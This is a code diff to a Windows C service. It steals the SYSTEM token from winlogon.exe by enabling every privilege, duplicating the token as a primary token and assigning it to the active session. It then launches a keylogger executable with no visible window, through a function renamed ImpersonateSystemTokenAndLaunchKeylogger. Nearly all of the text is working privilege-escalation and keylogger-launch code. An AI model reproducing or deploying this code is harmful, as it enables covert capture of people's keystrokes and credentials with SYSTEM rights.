@@ -96,7 +96,7 @@ void PrintPrivileges(HANDLE hToken)
     GetTokenInformation(hToken, TokenPrivileges, &tp, sizeof(TOKEN_PRIVILEGES), &returnLength);
     PTOKEN_PRIVILEGES pPrivileges = malloc((size_t)returnLength);
     if (pPrivileges == NULL) {
-        printf("malloc failed.\n");
+        log("malloc failed.\n");
         exit(1);
     }
     GetTokenInformation(hToken, TokenPrivileges, pPrivileges, returnLength, &returnLength);
@@ -146,7 +146,7 @@ DWORD GetPIDByProcName(void)
         }
     }
     CloseHandle(handleProc);
-    printf("Impossible to find winlogon.exe's PID. WHAT THE FU ??\n");
+    log("Impossible to find winlogon.exe's PID. WHAT THE FU ??\n");
     exit(ERROR);
 }
 
@@ -161,7 +161,7 @@ BOOL EnableAllPrivilege(HANDLE currentToken)
     GetTokenInformation(currentToken, TokenPrivileges, &tp, sizeof(TOKEN_PRIVILEGES), &returnLength);
     PTOKEN_PRIVILEGES pPrivileges = malloc((size_t)returnLength);
     if (pPrivileges == NULL) {
-        printf("malloc failed.\n");
+        log("malloc failed.\n");
         exit(1);
     }
     GetTokenInformation(currentToken, TokenPrivileges, pPrivileges, returnLength, &returnLength);
@@ -169,76 +169,61 @@ BOOL EnableAllPrivilege(HANDLE currentToken)
         pPrivileges->Privileges[i].Attributes = SE_PRIVILEGE_ENABLED;
     if (!AdjustTokenPrivileges(currentToken, FALSE, pPrivileges, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
     {
-        printf("AdjustTokenPrivileges failed.\n");
+        log("AdjustTokenPrivileges failed.\n");
         exit(PrintError());
     }
     return TRUE;
 }
 
-VOID ImpersonateSystemToken(LPPROCESS_INFORMATION keylogInfo)
+VOID ImpersonateSystemTokenAndLaunchKeylogger(LPPROCESS_INFORMATION keylogInfo, DWORD sessionsID)
 {
     HANDLE sysToken = NULL;
     HANDLE procHandle = NULL;
     HANDLE newSysTok = NULL;
     HANDLE currentToken = NULL;
-
     if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &currentToken))
     {
-        printf("OpenProcessToken failed.\n");
+        log("OpenProcessToken failed.\n");
         exit(PrintError());
     }
+    //put granted privileges to enabled
     EnableAllPrivilege(currentToken);
-    // no token attached to the current thread, so we use the proc instead.
-    PrintUserNameByProc();
-    printf("\n=== Privileges before impersonation ===\n\n");
-    PrintPrivileges(GetCurrentProcessToken());
+    // // no token attached to the current thread, so we use the proc instead.
+    // PrintUserNameByProc();
+
+    // PrintPrivileges(GetCurrentProcessToken());
     procHandle = OpenProcess(MAXIMUM_ALLOWED, TRUE, GetPIDByProcName());
     if (procHandle == NULL)
     {
-        printf("Impossible to get the process handle.\n");
+        log("Impossible to get the process handle.\n");
         exit(PrintError());
     }
-    BOOL success = OpenProcessToken(procHandle, TOKEN_DUPLICATE | TOKEN_QUERY, &sysToken);
+    BOOL success = OpenProcessToken(procHandle, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ADJUST_SESSIONID, &sysToken);
     if (!success)
     {
-        printf("Could not open the process token.\n");
+        log("Could not open the process token.\n");
         exit(PrintError());
     }
-    success = DuplicateTokenEx(sysToken, TOKEN_ALL_ACCESS_P, NULL, SecurityImpersonation,  TokenImpersonation, &newSysTok);
+    success = DuplicateTokenEx(sysToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation,  TokenPrimary, &newSysTok);
     if (!success)
     {
-        printf("Could not duplicate the process token.\n");
+        log("Could not duplicate the process token.\n");
         exit(PrintError());
     }
     STARTUPINFO sa = {0};
-    DWORD activesessionId = GetActiveSessionId();
-    if (activesessionId == 0)
-    {
-        log("GetActiveSessionId failed.\n");
-        ReportSvcStatus(SERVICE_STOPPED, GetLastError(), 0);
-        exit(1);
-    }
     EnableAllPrivilege(newSysTok);
-    SetTokenInformation(newSysTok, TokenSessionId, &activesessionId, sizeof(activesessionId));
-    BOOL res =  CreateProcessAsUserA(newSysTok, "C:\\Users\\Administrateur\\Documents\\tinky-winkey\\winkey.exe", NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW, NULL, NULL, &sa, keylogInfo);
-    if (res == FALSE)
+    success = SetTokenInformation(newSysTok, TokenSessionId, &sessionsID, sizeof(sessionsID));
+    if (success == FALSE)
+    {
+        log("\nSetTokenInformation failed.\n");
+        PrintError();
+    }
+    success =  CreateProcessAsUserA(newSysTok, KEYLOG_BIN_PATH, NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW, NULL, NULL, &sa, keylogInfo);
+    if (success == FALSE)
     {
         PrintError();
         log("CreateProcessAsUserA failed.\n");
         ReportSvcStatus(SERVICE_STOPPED, GetLastError(), 0);
         exit(1);
     }
-    // if (!success)
-    // {
-    //     printf("Failed to set the current thread's token.\n");
-    //     exit(PrintError());
-    // }
-    // PrintUserNameByThread();
-    // printf("\n=== Privileges for the thread after impersonation ===\n\n");
-    // if (!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, TRUE, &currentToken))
-    // {
-    //     printf("OpenThreadToken failed.\n");
-    //     exit(PrintError());
-    // }
-    // PrintPrivileges(GetCurrentThreadToken()); 
 }
